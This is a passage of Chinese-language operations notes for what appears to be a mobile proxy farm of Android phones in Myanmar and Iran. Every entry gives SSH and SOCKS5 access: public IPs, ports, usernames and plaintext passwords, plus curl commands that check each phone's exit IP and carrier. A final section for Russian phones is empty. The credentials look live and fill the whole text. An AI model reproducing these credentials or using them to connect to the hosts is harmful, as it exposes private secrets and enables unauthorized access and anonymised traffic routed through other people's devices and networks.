socks5://u0_a392:NL2019@162.128.72.136:21001
```

```bash
- 2d17bcf5
# ssh
  - 用户名：u0_a386
  -  密码：NL@2019
  -  端口：20000
ssh u0_a386@162.128.72.136:20000
  
# sock
  - 用户名：u0_a386
  -  密码：NL2019
  -  端口：21000
curl -v -x socks5://u0_a386:NL2019@162.128.72.136:21000 cip.cc
socks5://u0_a386:NL2019@162.128.72.136:21000
## IP	: 202.165.81.34
## 数据二	: 缅甸 | Telecom International Myanmar Co., Ltd（简称 Mytel） TIMCL2


- 99bd1f4f
# ssh
  - 用户名：u0_a392
  -  密码：NL@2019
  -  端口：20001
ssh u0_a392@162.128.72.136:20001
  
# sock
  - 用户名：u0_a392
  -  密码：NL2019
  -  端口：21001
curl -v -x socks5://u0_a392:NL2019@162.128.72.136:21001 cip.cc
socks5://u0_a392:NL2019@162.128.72.136:21001
## IP	: 37.111.5.218
## 数据三	: 缅甸Sagaing | Telenor（Atom Myanmar Limited（ATOM））
```



## IR 5台手机

```bash
curl ipinfo.io/5.62.235.92

# IR
##    ssh 密码：NL@2019
## socks5 密码：NL2019
- 863d005830483132385113d361828c
ssh u0_a229@66.93.15.102:20004
socks5://u0_a229:NL2019@66.93.15.102:21004

- 9b010059305331323800a0ef2c67c0
ssh u0_a225@66.93.15.102:20005
socks5://u0_a225:NL2019@66.93.15.102:21005

- 9b010059305331323800d5c53376c0
ssh u0_a225@66.93.15.102:20006
socks5://u0_a225:NL2019@66.93.15.102:21006

- IJSCDAT47PT86DEI
ssh u0_a227@66.93.15.102:20007
socks5://u0_a227:NL2019@66.93.15.102:21007

- 9b010059305331323800a94d2a267c
ssh u0_a222@66.93.15.102:20008
socks5://u0_a222:NL2019@66.93.15.102:21008
```

```bash
- 863d005830483132385113d361828c
# ssh
  - 用户名：u0_a229
  -  密码：NL@2019
  -  端口：20004
ssh u0_a229@66.93.15.102:20004
  
# sock
  - 用户名：u0_a229
  -  密码：NL2019
  -  端口：21004
curl -v -x socks5://u0_a229:NL2019@66.93.15.102:21004 cip.cc
socks5://u0_a229:NL2019@66.93.15.102:21004
## IP	: 213.195.38.243
## 数据三	: 伊朗 Rightel Communication Service Company PJS（Rightel）


- 9b010059305331323800a0ef2c67c0
# ssh
  - 用户名：u0_a225
  -  密码：NL@2019
  -  端口：20005
ssh u0_a225@66.93.15.102:20005
  
# sock
  - 用户名：u0_a225
  -  密码：NL2019
  -  端口：21005
curl -v -x socks5://u0_a225:NL2019@66.93.15.102:21005 cip.cc
socks5://u0_a225:NL2019@66.93.15.102:21005
## IP	: 5.217.187.57
## 数据三	: 伊朗 Mobile Communication Company of Iran PLC（MCI）


- 9b010059305331323800d5c53376c0
# ssh
  - 用户名：u0_a225
  -  密码：NL@2019
  -  端口：20006
ssh u0_a225@66.93.15.102:20006
  
# sock
  - 用户名：u0_a225
  -  密码：NL2019
  -  端口：21006
curl -v -x socks5://u0_a225:NL2019@66.93.15.102:21006 cip.cc
socks5://u0_a225:NL2019@66.93.15.102:21006
## IP	: 5.116.104.83
## 数据三	: 伊朗 Iran Cell Service and Communication Company（Irancell）


-  IJSCDAT47PT86DEI
# ssh
  - 用户名：u0_a227
  -  密码：NL@2019
  -  端口：20007
ssh u0_a227@66.93.15.102:20007
  
# sock
  - 用户名：u0_a227
  -  密码：NL2019
  -  端口：21007
curl -v -x socks5://u0_a227:NL2019@66.93.15.102:21007 cip.cc
socks5://u0_a227:NL2019@66.93.15.102:21007
## IP	: 5.62.235.92
## 数据三	: 伊朗 Rightel Communication Service Company PJS（Rightel）


-  9b010059305331323800a94d2a267c
# ssh
  - 用户名：u0_a222
  -  密码：NL@2019
  -  端口：20008
ssh u0_a222@66.93.15.102:20008
  
# sock
  - 用户名：u0_a222
  -  密码：NL2019
  -  端口：21008
curl -v -x socks5://u0_a222:NL2019@66.93.15.102:21008 cip.cc
socks5://u0_a222:NL2019@66.93.15.102:21008
## IP	: 172.80.139.236
## 数据三	: 伊朗 Mobile Communication Company of Iran PLC（MCI）
```

## RU2 2台手机

```bash

```

```bash

```

